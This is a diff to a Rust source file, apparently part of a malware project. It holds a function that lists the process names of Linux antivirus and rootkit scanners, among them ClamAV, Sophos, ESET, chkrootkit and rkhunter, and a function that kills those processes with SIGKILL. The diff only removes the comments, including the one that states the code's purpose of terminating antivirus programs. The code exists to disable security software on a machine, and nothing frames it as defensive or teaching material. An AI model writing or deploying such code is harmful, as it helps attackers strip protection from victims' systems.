@@ -3,39 +3,28 @@ use libc::{kill, SIGKILL};
 use procfs::process::all_processes;
 
 
-//#########  The following code checks for possible antivirus programs running and terminates their processes.
 
 pub fn antivirus_verification() {
 
     let antivirus_processes = [
-        // ClamAV
+    
         "clamd",
         "freshclam",
 
-        // Sophos Antivirus for Linux
+    
         "savd",
         "savscan",
         "sav-protect",
 
-        // ESET NOD32 Antivirus for Linux
         "esets_daemon",
         "esets",
-
-        // Bitdefender Antivirus Scanner for Unices
         "bdscan",
 
-        // Comodo Antivirus for Linux
         "cmdagent",
         "cmgdaemon",
-
-        // F-Prot Antivirus for Linux
         "fpscand",
         "fpavupdm",
-
-        // Chkrootkit
         "chkrootkit",
-
-        // Rkhunter
         "rkhunter",
     ];
 
@@ -63,7 +52,6 @@ pub fn remove(pid: i32){
     if let Ok(process) = Process::new(pid) {
         println!("Encerrando o processo: {}", process.stat().unwrap().comm);
 
-        // Remove a execucao
         let result = unsafe { kill(pid, SIGKILL) };
 
         if result == 0 {
